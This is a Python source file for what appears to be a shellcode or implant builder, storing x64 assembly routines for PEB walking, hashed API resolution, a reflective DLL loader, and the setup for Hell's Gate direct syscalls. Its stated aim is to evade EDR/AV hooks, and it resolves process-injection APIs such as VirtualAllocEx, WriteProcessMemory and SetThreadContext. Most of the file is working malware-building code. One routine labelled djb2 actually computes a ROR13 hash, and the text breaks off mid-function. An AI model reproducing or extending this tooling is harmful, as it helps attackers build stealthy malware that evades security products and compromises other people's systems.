class WindowsHelpers:
    """
    Windows-specific helper functions for low-level syscall operations.
    
    Implements advanced techniques for:
    - PEB walking for module enumeration
    - PE Export Directory parsing
    - Direct syscall invocation (Hell's Gate)
    - Hook detection and evasion (Halo's Gate / Tartarus' Gate)
    - Indirect syscall execution via gadget hunting
    
    All functions are position-independent and avoid API calls that
    may be hooked by EDR/AV solutions.
    """
    
    def __init__(self, arch='x86_64'):
        self.arch = arch
        self.functions = {}
        self._init_library()
    
    def get_dependencies(self, used_functions):
        """Recursively get all dependencies"""
        code = []
        data = []
        bss = []
        externs = set()
        processed = set()
        
        def process_function(func_name):
            if func_name in processed or func_name not in self.functions:
                return
            
            processed.add(func_name)
            func_data = self.functions[func_name]
            
            # Process dependencies first
            if 'requires' in func_data:
                for req in func_data['requires']:
                    process_function(req)
            
            # Add function code
            if func_data['code']:
                code.append(func_data['code'])
            
            if 'data' in func_data:
                data.extend(func_data['data'])
            if 'bss' in func_data:
                bss.extend(func_data['bss'])
            if 'externs' in func_data:
                externs.update(func_data['externs'])
        
        for func in used_functions:
            process_function(func)
        
        return {
            'code': '\n\n'.join(code),
            'data': data,
            'bss': bss,
            'externs': externs
        }
    
    def _init_library(self):
        """Initialize all Windows helper functions"""
        self._init_string_utils()
        self._init_hash_utils()
        self._init_peb_helpers()
        self._init_pe_parser()
        self._init_syscall_helpers()
        self._init_indirect_syscall()
    
    def _init_string_utils(self):
        """String manipulation utilities"""
        
        # strlen - Get string length
        self.functions['strlen'] = {
            'code': '''; ==============================================================================
; UTILS: String Length
; Input:  RCX = Pointer to null-terminated string
; Output: RAX = Length of string (not including null terminator)
; Preserves: RBX, RSI, RDI, RBP, R12-R15
; ==============================================================================
strlen:
    xor rax, rax                ; Initialize counter to 0
    test rcx, rcx               ; Check for null pointer
    jz .strlen_done
.strlen_loop:
    cmp byte [rcx + rax], 0     ; Check for null terminator
    je .strlen_done
    inc rax                     ; Increment counter
    jmp .strlen_loop
.strlen_done:
    ret''',
            'externs': set()
        }
        
        # strcmp - Compare two strings
        self.functions['strcmp'] = {
            'code': '''; ==============================================================================
; UTILS: String Compare (case-sensitive)
; Input:  RCX = String1, RDX = String2
; Output: RAX = 0 if equal, 1 if String1 > String2, -1 if String1 < String2
; Preserves: RBX, RBP, R12-R15
; ==============================================================================
strcmp:
    push rsi
    push rdi
    mov rsi, rcx                ; RSI = String1
    mov rdi, rdx                ; RDI = String2
    
    test rsi, rsi               ; Null check String1
    jz .strcmp_null1
    test rdi, rdi               ; Null check String2
    jz .strcmp_null2
    
.strcmp_loop:
    movzx eax, byte [rsi]       ; Load char from String1
    movzx ecx, byte [rdi]       ; Load char from String2
    
    cmp al, cl                  ; Compare characters
    jne .strcmp_diff
    
    test al, al                 ; Check for end of string
    jz .strcmp_match
    
    inc rsi                     ; Advance pointers
    inc rdi
    jmp .strcmp_loop
    
.strcmp_diff:
    sbb rax, rax                ; RAX = -1 if String1 < String2
    or rax, 1                   ; RAX = 1 if String1 > String2
    pop rdi
    pop rsi
    ret
    
.strcmp_match:
    xor rax, rax                ; Strings are equal
    pop rdi
    pop rsi
    ret
    
.strcmp_null1:
    test rdi, rdi
    jz .strcmp_match            ; Both null = equal
    mov rax, -1                 ; String1 is null, String2 is not
    pop rdi
    pop rsi
    ret
    
.strcmp_null2:
    mov rax, 1                  ; String2 is null, String1 is not
    pop rdi
    pop rsi
    ret''',
            'externs': set()
        }
        
        # stricmp - Case-insensitive string compare
        self.functions['stricmp'] = {
            'code': '''; ==============================================================================
; UTILS: String Compare (case-insensitive)
; Input:  RCX = String1, RDX = String2
; Output: RAX = 0 if equal, non-zero if different
; Preserves: RBX, RBP, R12-R15
; ==============================================================================
stricmp:
    push rsi
    push rdi
    push rbx
    mov rsi, rcx
    mov rdi, rdx
    
.stricmp_loop:
    movzx eax, byte [rsi]
    movzx ebx, byte [rdi]
    
    ; Convert to lowercase if uppercase (A-Z -> a-z)
    cmp al, 'A'
    jb .stricmp_skip1
    cmp al, 'Z'
    ja .stricmp_skip1
    add al, 32                  ; Convert to lowercase
.stricmp_skip1:
    cmp bl, 'A'
    jb .stricmp_skip2
    cmp bl, 'Z'
    ja .stricmp_skip2
    add bl, 32
.stricmp_skip2:
    
    cmp al, bl
    jne .stricmp_diff
    test al, al
    jz .stricmp_match
    
    inc rsi
    inc rdi
    jmp .stricmp_loop
    
.stricmp_diff:
    mov rax, 1
    pop rbx
    pop rdi
    pop rsi
    ret
    
.stricmp_match:
    xor rax, rax
    pop rbx
    pop rdi
    pop rsi
    ret''',
            'externs': set()
        }
        
        # string_compare - Simple string compare (returns 1 if match, 0 if not)
        self.functions['string_compare'] = {
            'code': '''; ==============================================================================
; UTILS: String Compare (simple version)
; Input:  RCX = String1, RDX = String2
; Output: RAX = 1 if equal, 0 if not
; Preserves: RBX, RBP, R12-R15
; ==============================================================================
string_compare:
    push rsi
    push rdi
    mov rsi, rcx
    mov rdi, rdx
.loop:
    mov al, [rsi]
    mov bl, [rdi]
    cmp al, bl
    jne .fail
    test al, al
    jz .match
    inc rsi
    inc rdi
    jmp .loop
.match:
    mov rax, 1
    jmp .done
.fail:
    xor rax, rax
.done:
    pop rdi
    pop rsi
    ret''',
            'externs': set()
        }
        
        # memcpy - Memory copy
        self.functions['memcpy'] = {
            'code': '''; ==============================================================================
; UTILS: Memory Copy
; Input:  RCX = Destination, RDX = Source, R8 = Size
; Output: RAX = Destination pointer
; ==============================================================================
memcpy:
    push rdi
    push rsi
    push rcx                    ; Save destination for return
    
    mov rdi, rcx                ; Destination
    mov rsi, rdx                ; Source
    mov rcx, r8                 ; Size
    
    ; Copy 8 bytes at a time if possible
    mov rax, rcx
    shr rcx, 3                  ; Divide by 8
    rep movsq                   ; Copy quadwords
    
    mov rcx, rax
    and rcx, 7                  ; Remaining bytes
    rep movsb                   ; Copy remaining bytes
    
    pop rax                     ; Return destination
    pop rsi
    pop rdi
    ret''',
            'externs': set()
        }
        
        # memset - Memory set
        self.functions['memset'] = {
            'code': '''; ==============================================================================
; UTILS: Memory Set
; Input:  RCX = Destination, DL = Value, R8 = Size
; Output: RAX = Destination pointer
; ==============================================================================
memset:
    push rdi
    push rcx                    ; Save destination for return
    
    mov rdi, rcx                ; Destination
    movzx eax, dl               ; Value to set
    mov rcx, r8                 ; Size
    
    ; Create 8-byte pattern
    mov ah, al
    mov rdx, rax
    shl rdx, 16
    or rax, rdx
    mov rdx, rax
    shl rdx, 32
    or rax, rdx
    
    ; Set 8 bytes at a time
    push rax
    mov rax, rcx
    shr rcx, 3
    pop rax
    push rax
    rep stosq
    pop rax
    
    push rax
    mov rax, r8
    and rcx, 7
    pop rax
    rep stosb
    
    pop rax                     ; Return destination
    pop rdi
    ret''',
            'externs': set()
        }
    
    def _init_hash_utils(self):
        """Hashing utilities for API resolution"""
        
        # djb2_hash - DJB2 hash algorithm for string hashing
        self.functions['djb2_hash'] = {
            'code': '''; ==============================================================================
; UTILS: DJB2 Hash Algorithm
; Input:  RCX = Pointer to null-terminated string
; Output: RAX = 32-bit hash value
; Used for API hashing to avoid string detection
; ==============================================================================
djb2_hash:
    push rbx
    mov rax, 5381               ; Initial hash value
    
.djb2_loop:
    movzx ebx, byte [rcx]
    test bl, bl
    jz .djb2_done
    
    ; hash = hash * 33 + c
    mov rdx, rax
    shl rax, 5                  ; hash * 32
    add rax, rdx                ; hash * 33
    add rax, rbx                ; + character
    
    inc rcx
    jmp .djb2_loop
    
.djb2_done:
    ; Return lower 32 bits
    mov eax, eax                ; Zero-extend to clear upper bits
    pop rbx
    ret''',
            'externs': set()
        }
        
        # ror13_hash - ROR13 hash (common in shellcode)
        self.functions['ror13_hash'] = {
            'code': '''; ==============================================================================
; UTILS: ROR13 Hash Algorithm (Metasploit-style)
; Input:  RCX = Pointer to null-terminated string
; Output: EAX = 32-bit hash value
; Common in shellcode for compact API resolution
; ==============================================================================
ror13_hash:
    push rbx
    xor eax, eax                ; Initialize hash to 0
    
.ror13_loop:
    movzx ebx, byte [rcx]
    test bl, bl
    jz .ror13_done
    
    ; Convert to uppercase for consistency
    cmp bl, 'a'
    jb .ror13_no_upper
    cmp bl, 'z'
    ja .ror13_no_upper
    sub bl, 32
.ror13_no_upper:
    
    ; ROR by 13 bits
    ror eax, 13
    add eax, ebx
    
    inc rcx
    jmp .ror13_loop
    
.ror13_done:
    pop rbx
    ret''',
            'externs': set()
        }
    
    def _init_peb_helpers(self):
        """PEB walking functions for module enumeration"""
        
        # GetNtdllBase - Get ntdll.dll base via PEB
        self.functions['GetNtdllBase'] = {
            'code': '''; ==============================================================================
; GetNtdllBase: Walks PEB to find ntdll.dll base address
; Input:  None
; Output: RAX = Base address of ntdll.dll, 0 on failure
; 
; PEB Structure (x64):
;   gs:[0x60] -> PEB
;   PEB+0x18  -> PEB_LDR_DATA
;   LDR+0x20  -> InMemoryOrderModuleList (LIST_ENTRY)
;
; Module order in InMemoryOrderModuleList:
;   1st: Current process executable
;   2nd: ntdll.dll
;   3rd: kernel32.dll
; ==============================================================================
GetNtdllBase:
    xor rax, rax
    
    ; Get PEB from TEB
    mov rax, gs:[0x60]          ; PEB
    test rax, rax
    jz .ntdll_fail
    
    ; Get PEB_LDR_DATA
    mov rax, [rax + 0x18]       ; PEB->Ldr
    test rax, rax
    jz .ntdll_fail
    
    ; Get InMemoryOrderModuleList head
    mov rax, [rax + 0x20]       ; InMemoryOrderModuleList.Flink
    test rax, rax
    jz .ntdll_fail
    
    ; First entry is the executable itself, skip it
    mov rax, [rax]              ; 1st Entry->Flink (ntdll.dll entry)
    test rax, rax
    jz .ntdll_fail
    
    ; Get DllBase from LDR_DATA_TABLE_ENTRY
    ; In InMemoryOrderLinks: DllBase is at offset 0x20 from Flink
    mov rax, [rax + 0x20]       ; DllBase
    ret
    
.ntdll_fail:
    xor rax, rax
    ret''',
            'externs': set()
        }
        
        # GetKernel32Base - Get kernel32.dll base via PEB
        self.functions['GetKernel32Base'] = {
            'code': '''; ==============================================================================
; GetKernel32Base: Walks PEB to find kernel32.dll base address
; Input:  None
; Output: RAX = Base address of kernel32.dll, 0 on failure
; ==============================================================================
GetKernel32Base:
    xor rax, rax
    
    mov rax, gs:[0x60]          ; PEB
    test rax, rax
    jz .k32_fail
    
    mov rax, [rax + 0x18]       ; PEB->Ldr
    test rax, rax
    jz .k32_fail
    
    mov rax, [rax + 0x20]       ; InMemoryOrderModuleList.Flink
    test rax, rax
    jz .k32_fail
    
    mov rax, [rax]              ; Skip executable
    test rax, rax
    jz .k32_fail
    
    mov rax, [rax]              ; Skip ntdll.dll -> kernel32.dll entry
    test rax, rax
    jz .k32_fail
    
    mov rax, [rax + 0x20]       ; DllBase
    ret
    
.k32_fail:
    xor rax, rax
    ret''',
            'externs': set()
        }
        
        # GetModuleByHash - Find module by name hash
        self.functions['GetModuleByHash'] = {
            'code': '''; ==============================================================================
; GetModuleByHash: Find module base by hashed name
; Input:  ECX = Target hash (ROR13 hash of module name)
; Output: RAX = Base address of module, 0 if not found
; ==============================================================================
GetModuleByHash:
    push rbx
    push rsi
    push rdi
    push r12
    
    mov r12d, ecx               ; Save target hash
    
    ; Get PEB->Ldr
    mov rax, gs:[0x60]
    test rax, rax
    jz .mod_hash_fail
    mov rax, [rax + 0x18]
    test rax, rax
    jz .mod_hash_fail
    
    ; Get InMemoryOrderModuleList head and save it
    lea rbx, [rax + 0x20]       ; List head
    mov rsi, [rbx]              ; First entry
    
.mod_hash_loop:
    cmp rsi, rbx                ; Check if we've wrapped around
    je .mod_hash_fail
    
    ; Get module name (UNICODE_STRING at offset 0x48 from InMemoryOrderLinks)
    ; Actually, FullDllName is at offset 0x48, BaseDllName at 0x58
    mov rdi, [rsi + 0x50]       ; BaseDllName.Buffer (UNICODE)
    test rdi, rdi
    jz .mod_hash_next
    
    ; Hash the unicode module name
    xor eax, eax
.mod_hash_name:
    movzx ecx, word [rdi]       ; Load wide char
    test cx, cx
    jz .mod_hash_check
    
    ; Convert to uppercase
    cmp cl, 'a'
    jb .mod_hash_upper
    cmp cl, 'z'
    ja .mod_hash_upper
    sub cl, 32
.mod_hash_upper:
    
    ror eax, 13
    add eax, ecx
    add rdi, 2
    jmp .mod_hash_name
    
.mod_hash_check:
    cmp eax, r12d               ; Compare with target hash
    je .mod_hash_found
    
.mod_hash_next:
    mov rsi, [rsi]              ; Next entry
    jmp .mod_hash_loop
    
.mod_hash_found:
    mov rax, [rsi + 0x20]       ; DllBase
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
    
.mod_hash_fail:
    xor rax, rax
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': []
        }
    
    def _init_pe_parser(self):
        """PE format parsing functions"""
        
        # GetExportDirectory - Get export directory from PE
        self.functions['GetExportDirectory'] = {
            'code': '''; ==============================================================================
; GetExportDirectory: Parse PE to find Export Directory
; Input:  RCX = Module base address
; Output: RAX = Pointer to IMAGE_EXPORT_DIRECTORY, 0 on failure
; ==============================================================================
GetExportDirectory:
    push rbx
    
    test rcx, rcx
    jz .export_fail
    
    mov rbx, rcx                ; Save base
    
    ; Check DOS signature "MZ"
    cmp word [rbx], 0x5A4D
    jne .export_fail
    
    ; Get PE header offset
    mov eax, [rbx + 0x3C]       ; e_lfanew
    add rax, rbx                ; NT Headers
    
    ; Check PE signature
    cmp dword [rax], 0x4550     ; PE signature
    jne .export_fail
    
    ; Get Export Directory RVA from Optional Header
    ; For x64: OptionalHeader starts at offset 0x18 from NT Headers
    ; DataDirectory[0] is at offset 0x70 from OptionalHeader start
    ; Total: 0x18 + 0x70 = 0x88 from NT Headers
    mov eax, [rax + 0x88]       ; Export Directory RVA
    test eax, eax
    jz .export_fail
    
    add rax, rbx                ; Convert RVA to VA
    pop rbx
    ret
    
.export_fail:
    xor rax, rax
    pop rbx
    ret''',
            'externs': set()
        }
        
        # GetProcAddressByName - Resolve function address by name
        self.functions['GetProcAddressByName'] = {
            'code': '''; ==============================================================================
; GetProcAddressByName: Find function address in module by name
; Input:  RCX = Module base, RDX = Function name (null-terminated)
; Output: RAX = Function address, 0 if not found
; ==============================================================================
GetProcAddressByName:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 32
    
    mov r12, rcx                ; Module base
    mov r13, rdx                ; Function name
    
    ; Get Export Directory
    call GetExportDirectory
    test rax, rax
    jz .proc_name_fail
    mov r14, rax                ; Export Directory
    
    ; Get export table pointers
    mov ecx, [r14 + 0x18]       ; NumberOfNames
    mov r15d, ecx               ; Save count
    
    mov eax, [r14 + 0x20]       ; AddressOfNames RVA
    add rax, r12                ; AddressOfNames VA
    mov rbx, rax
    
    xor rsi, rsi                ; Index = 0
    
.proc_name_loop:
    cmp rsi, r15
    jge .proc_name_fail
    
    ; Get name pointer
    mov eax, [rbx + rsi * 4]    ; Name RVA
    add rax, r12                ; Name VA
    
    ; Compare with target name
    mov rcx, r13                ; Target name
    mov rdx, rax                ; Current name
    
.proc_name_cmp:
    movzx eax, byte [rcx]
    movzx edi, byte [rdx]
    cmp al, dil
    jne .proc_name_next
    test al, al
    jz .proc_name_found
    inc rcx
    inc rdx
    jmp .proc_name_cmp
    
.proc_name_next:
    inc rsi
    jmp .proc_name_loop
    
.proc_name_found:
    ; Get ordinal from AddressOfNameOrdinals
    mov eax, [r14 + 0x24]       ; AddressOfNameOrdinals RVA
    add rax, r12
    movzx edx, word [rax + rsi * 2]
    
    ; Get function address from AddressOfFunctions
    mov eax, [r14 + 0x1C]       ; AddressOfFunctions RVA
    add rax, r12
    mov eax, [rax + rdx * 4]    ; Function RVA
    add rax, r12                ; Function VA
    
    add rsp, 32
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
    
.proc_name_fail:
    xor rax, rax
    add rsp, 32
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['GetExportDirectory']
        }
        
        # GetProcAddressByHash - Resolve function by hash
        self.functions['GetProcAddressByHash'] = {
            'code': '''; ==============================================================================
; GetProcAddressByHash: Find function address by name hash
; Input:  RCX = Module base, EDX = Function name hash (ROR13)
; Output: RAX = Function address, 0 if not found
; ==============================================================================
GetProcAddressByHash:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 32
    
    mov r12, rcx                ; Module base
    mov r13d, edx               ; Target hash
    
    ; Get Export Directory
    call GetExportDirectory
    test rax, rax
    jz .proc_hash_fail
    mov r14, rax
    
    mov ecx, [r14 + 0x18]       ; NumberOfNames
    mov r15d, ecx
    
    mov eax, [r14 + 0x20]
    add rax, r12
    mov rbx, rax                ; AddressOfNames VA
    
    xor rsi, rsi
    
.proc_hash_loop:
    cmp rsi, r15
    jge .proc_hash_fail
    
    ; Get name and hash it
    mov eax, [rbx + rsi * 4]
    add rax, r12
    mov rdi, rax                ; Function name
    
    xor eax, eax                ; Hash accumulator
.proc_hash_name:
    movzx ecx, byte [rdi]
    test cl, cl
    jz .proc_hash_check
    
    ror eax, 13
    add eax, ecx
    inc rdi
    jmp .proc_hash_name
    
.proc_hash_check:
    cmp eax, r13d
    je .proc_hash_found
    inc rsi
    jmp .proc_hash_loop
    
.proc_hash_found:
    mov eax, [r14 + 0x24]
    add rax, r12
    movzx edx, word [rax + rsi * 2]
    
    mov eax, [r14 + 0x1C]
    add rax, r12
    mov eax, [rax + rdx * 4]
    add rax, r12
    
    add rsp, 32
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
    
.proc_hash_fail:
    xor rax, rax
    add rsp, 32
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['GetExportDirectory']
        }
        
        # reflective_loader - Reflective DLL loader shellcode
        self.functions['reflective_loader'] = {
            'code': '''; ==============================================================================
; Reflective Loader: Loads a PE image in memory, resolves imports/relocs, calls entry
; Input:  RCX = ImageBase (address of mapped PE)
; Output: None (calls DllMain)
; ==============================================================================
reflective_loader:
    push rbp
    mov rbp, rsp
    sub rsp, 0x200          ; Reserve stack

    mov [rbp - 0x08], rcx   ; Store ImageBase (passed as arg)

    ; --- 1. Get Kernel32 Base ---
    mov rax, qword gs:[0x60]        ; PEB
    mov rax, [rax + 0x18]           ; PEB_LDR_DATA
    mov rax, [rax + 0x20]           ; InMemoryOrderList
    mov rax, [rax]                  ; 1st
    mov rax, [rax]                  ; 2nd (ntdll)
    mov rax, [rax]                  ; 3rd (kernel32)
    mov rbx, [rax + 0x20]           ; DllBase
    mov [rbp - 0x10], rbx           ; Save Kernel32

    ; --- 2. Resolve API (Quick & Dirty hashless search for brevity) ---
    ; Need: LoadLibraryA, GetProcAddress
    ; See previous example for full resolution logic. 
    ; For this single file, I will perform a minimal resolution loop here.

    mov r8d, [rbx + 0x3C]
    mov r8d, [rbx + r8 + 0x88] ; Export Dir RVA
    add r8, rbx
    mov r9d, [r8 + 0x20]       ; Names
    add r9, rbx
    mov r10d, [r8 + 0x24]      ; Ordinals
    add r10, rbx
    mov r11d, [r8 + 0x1C]      ; Funcs
    add r11, rbx
    mov ecx, [r8 + 0x18]       ; Count
    xor rdi, rdi

.find_loop:
    jecxz .done_resolve
    dec ecx
    mov edx, [r9 + rdi * 4]
    add rdx, rbx               ; String ptr

    ; Check "GetProcA" (0x41636F7250746547)
    mov rsi, 0x41636F7250746547
    cmp [rdx], rsi
    jne .check_lla

    ; Found GetProcAddress
    movzx r12, word [r10 + rdi * 2]
    mov r12d, [r11 + r12 * 4]
    add r12, rbx
    mov [rbp - 0x20], r12      ; Save GetProcAddress
    jmp .next_iter

.check_lla:
    ; Check "LoadLibr" (0x7262694C64616F4C)
    mov rsi, 0x7262694C64616F4C
    cmp [rdx], rsi
    jne .next_iter

    ; Found LoadLibraryA
    movzx r12, word [r10 + rdi * 2]
    mov r12d, [r11 + r12 * 4]
    add r12, rbx
    mov [rbp - 0x18], r12      ; Save LoadLibraryA

.next_iter:
    inc rdi
    ; If both found, break (omitted for brevity, just loops all)
    jmp .find_loop

.done_resolve:

    ; --- 3. Relocations ---
    mov rsi, [rbp - 0x08]       ; New Base
    mov ebx, [rsi + 0x3C]
    add rbx, rsi                ; NT Headers
    mov rdi, [rbx + 0x30]       ; Preferred Base
    sub rsi, rdi                ; Delta
    test rsi, rsi
    jz .imports                 ; Delta 0, skip

    mov eax, [rbx + 0x88 + 40]  ; Reloc Dir RVA (Index 5 * 8)
    test eax, eax
    jz .imports
    add rax, [rbp - 0x08]       ; VA
    
    ; Simple Reloc Loop (Block based)
.reloc_loop:
    mov r8d, [rax + 4]          ; Block Size
    test r8d, r8d
    jz .imports
    mov r9d, [rax]              ; Page RVA
    add r9, [rbp - 0x08]        ; Page VA
    lea rdx, [rax + 8]          ; Entries
    lea r10, [rax + r8]         ; End of block
.entry_loop:
    cmp rdx, r10
    jae .next_block
    movzx r11, word [rdx]
    mov r12, r11
    shr r12, 12                 ; Type
    and r11, 0xFFF              ; Offset
    cmp r12, 0xA                ; DIR64
    jne .skip_fixup
    add [r9 + r11], rsi         ; Apply Delta
.skip_fixup:
    add rdx, 2
    jmp .entry_loop
.next_block:
    mov rax, r10
    jmp .reloc_loop

    ; --- 4. Imports ---
.imports:
    mov rbx, [rbp - 0x08]       ; ImageBase
    mov eax, [rbx + 0x3C]
    add rax, rbx
    mov eax, [rax + 0x88 + 8]   ; Import Dir RVA (Index 1 * 8)
    test eax, eax
    jz .entrypoint
    add rax, rbx                ; Import Dir VA
    mov rsi, rax

.imp_dll_loop:
    mov eax, [rsi + 0x0C]       ; Name RVA
    test eax, eax
    jz .entrypoint
    add rax, rbx                ; Name VA
    
    mov rcx, rax
    sub rsp, 0x20
    call [rbp - 0x18]           ; LoadLibraryA
    add rsp, 0x20
    mov rdi, rax                ; Module Handle

    mov eax, [rsi + 0x00]       ; OriginalFirstThunk
    test eax, eax
    jnz .has_int
    mov eax, [rsi + 0x10]       ; FirstThunk
.has_int:
    add rax, rbx
    mov r12, rax                ; INT
    mov eax, [rsi + 0x10]
    add rax, rbx
    mov r13, rax                ; IAT

.imp_func_loop:
    mov rax, [r12]
    test rax, rax
    jz .next_dll
    test rax, 0x8000000000000000
    jnz .ordinal
    add rax, rbx
    add rax, 2                  ; Name String
    jmp .resolve
.ordinal:
    and rax, 0xFFFF
.resolve:
    mov rcx, rdi
    mov rdx, rax
    sub rsp, 0x20
    call [rbp - 0x20]           ; GetProcAddress
    add rsp, 0x20
    mov [r13], rax
    add r12, 8
    add r13, 8
    jmp .imp_func_loop

.next_dll:
    add rsi, 20
    jmp .imp_dll_loop

    ; --- 5. Entry Point ---
.entrypoint:
    mov rbx, [rbp - 0x08]
    mov eax, [rbx + 0x3C]
    add rax, rbx
    mov eax, [rax + 0x28]       ; EntryPoint RVA
    add rax, rbx                ; EntryPoint VA
    
    mov rcx, rbx                ; hInstance
    mov edx, 1                  ; DLL_PROCESS_ATTACH
    xor r8, r8                  ; Reserved
    sub rsp, 0x20
    call rax                    ; Call DllMain
    add rsp, 0x20

    leave
    ret''',
            'externs': set()
        }
        
        # ResolveAPIs - Resolve multiple APIs by hash
        self.functions['ResolveAPIs'] = {
            'code': '''; ==============================================================================
; ResolveAPIs: Resolve common Windows APIs by hash
; Input:  None
; Output: Stores function pointers in global variables
; ==============================================================================
ResolveAPIs:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    call GetKernel32
    mov r14, rax

    mov rcx, r14
    mov edx, HASH_CREATEPROCESSA
    call GetProcAddrByHash
    mov [pCreateProcessA], rax

    mov rcx, r14
    mov edx, HASH_VIRTUALALLOCEX
    call GetProcAddrByHash
    mov [pVirtualAllocEx], rax

    mov rcx, r14
    mov edx, HASH_WRITEPROCESSMEMORY
    call GetProcAddrByHash
    mov [pWriteProcessMemory], rax

    mov rcx, r14
    mov edx, HASH_GETTHREADCONTEXT
    call GetProcAddrByHash
    mov [pGetThreadContext], rax

    mov rcx, r14
    mov edx, HASH_SETTHREADCONTEXT
    call GetProcAddrByHash
    mov [pSetThreadContext], rax

    mov rcx, r14
    mov edx, HASH_RESUMETHREAD
    call GetProcAddrByHash
    mov [pResumeThread], rax
    
    mov rcx, r14
    mov edx, HASH_TERMINATEPROCESS
    call GetProcAddrByHash
    mov [pTerminateProcess], rax

    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'data': ['HASH_CREATEPROCESSA equ 0x4C8A2B7F', 'HASH_VIRTUALALLOCEX equ 0x829F2C3A', 'HASH_WRITEPROCESSMEMORY equ 0xD83D6AA1', 'HASH_GETTHREADCONTEXT equ 0x68A7C7D2', 'HASH_SETTHREADCONTEXT equ 0xE8A7C7D2', 'HASH_RESUMETHREAD equ 0x9E4A3B2C', 'HASH_TERMINATEPROCESS equ 0x78B5C4D3'],
            'bss': ['pCreateProcessA resq 1', 'pVirtualAllocEx resq 1', 'pWriteProcessMemory resq 1', 'pGetThreadContext resq 1', 'pSetThreadContext resq 1', 'pResumeThread resq 1', 'pTerminateProcess resq 1'],
            'externs': set(),
            'requires': ['GetKernel32', 'GetProcAddrByHash']
        }
        
        # GetKernel32 - Get base address of kernel32.dll
        self.functions['GetKernel32'] = {
            'code': '''; ==============================================================================
; GetKernel32: Get kernel32.dll base address via PEB
; Input:  None
; Output: RAX = kernel32 base address
; ==============================================================================
GetKernel32:
    mov rax, qword gs:[0x60]
    mov rax, [rax + 0x18]
    mov rax, [rax + 0x20]
    mov rax, [rax]
    mov rax, [rax]
    mov rax, [rax]
    mov rax, [rax + 0x20]
    ret''',
            'externs': set()
        }
        
        # GetProcAddrByHash - Get function address by hash
        self.functions['GetProcAddrByHash'] = {
            'code': '''; ==============================================================================
; GetProcAddrByHash: Resolve API by hash from export table
; Input:  RCX = Module base, RDX = Hash
; Output: RAX = Function address or 0
; ==============================================================================
GetProcAddrByHash:
    push rbx
    push rsi
    push rdi
    
    mov rbx, rcx
    mov ecx, [rbx + 0x3C]
    add rcx, rbx
    
    mov eax, [rcx + 0x88]
    add rax, rbx
    
    mov ecx, [rax + 0x18]
    mov r8d, [rax + 0x20]
    add r8, rbx
    
    mov r9d, [rax + 0x24]
    add r9, rbx
    
    mov r10d, [rax + 0x1C]
    add r10, rbx
    
    xor r11, r11

.loop:
    test ecx, ecx
    jz .not_found
    
    mov esi, [r8 + r11 * 4]
    add rsi, rbx
    
    push rdx
    push rcx
    call CalcHash
    mov rdi, rax
    pop rcx
    pop rdx
    
    cmp edi, edx
    je .found
    
    inc r11
    dec ecx
    jmp .loop

.found:
    movzx r11, word [r9 + r11 * 2]
    mov eax, [r10 + r11 * 4]
    add rax, rbx
    jmp .done

.not_found:
    xor rax, rax

.done:
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['CalcHash']
        }
        
        # CalcHash - Calculate djb2 hash of string
        self.functions['CalcHash'] = {
            'code': '''; ==============================================================================
; CalcHash: Calculate djb2 hash of null-terminated string
; Input:  RSI = Pointer to string
; Output: RAX = Hash value
; ==============================================================================
CalcHash:
    xor rax, rax
    xor rdx, rdx
.hash_loop:
    mov dl, [rsi]
    test dl, dl
    jz .hash_done
    
    ror eax, 13
    add eax, edx
    
    inc rsi
    jmp .hash_loop
.hash_done:
    ret''',
            'externs': set()
        }

        # GetAPIByName - Hash a function name and resolve its address from a module base
        self.functions['GetAPIByName'] = {
            'code': '''; ======================================================================
; GetAPIByName: Given a module base (RCX) and a function name pointer (RDX),
;               compute the hash and resolve the function address.
; Input:  RCX = Module base, RDX = Pointer to ASCII function name
; Output: RAX = Function address or 0
; Requires: CalcHash, GetProcAddrByHash
; ======================================================================
GetAPIByName:
    push rbx
    push rsi
    push rdi

    mov rsi, rdx        ; RSI = function name pointer
    call CalcHash       ; RAX = hash
    mov edx, eax        ; RDX = hash
    mov rcx, rcx        ; RCX = module base (already set)
    call GetProcAddrByHash

    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['CalcHash', 'GetProcAddrByHash']
        }

        # GetAPI - Convenience wrapper: resolve API by name; if RCX==0 use kernel32
        self.functions['GetAPI'] = {
            'code': '''; ======================================================================
; GetAPI: Resolve an API by its ASCII name. If RCX==0, uses kernel32 base.
; Input:  RCX = Module base (0 to use kernel32), RDX = Pointer to ASCII name
; Output: RAX = Function address or 0
; Requires: GetKernel32, GetAPIByName
; ======================================================================
GetAPI:
    push rbx
    push rcx
    push rdx

    test rcx, rcx
    jnz .has_base
    call GetKernel32
    mov rcx, rax
.has_base:
    mov rdx, rdx
    call GetAPIByName

    pop rdx
    pop rcx
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['GetKernel32', 'GetAPIByName']
        }
    
    def _init_syscall_helpers(self):
        """Direct and indirect syscall helpers"""
        
        # ExtractSSN - Extract System Service Number from function
        self.functions['ExtractSSN'] = {
            'code': '''; ==============================================================================
; ExtractSSN: Extract SSN from ntdll syscall stub
; Input:  RCX = Function address in ntdll
; Output: EAX = SSN (System Service Number), -1 on failure/hook detected
;
; Windows x64 Syscall Stub Pattern:
;   4C 8B D1        mov r10, rcx        ; offset 0
;   B8 XX XX 00 00  mov eax, SSN        ; offset 3 (SSN at offset 4)
;   F6 04 25 ...    test byte [...], .. ; offset 8 (optional, Win10+)
;   ...
;   0F 05           syscall
;   C3              ret
;
; EDR Hook Signatures:
;   E9 XX XX XX XX  jmp rel32           ; Inline hook
;   FF 25 ...       jmp [rip+...]       ; Absolute jump
;   68 XX ... C3    push + ret          ; Push-ret gadget
; ==============================================================================
ExtractSSN:
    push rbx
    
    test rcx, rcx
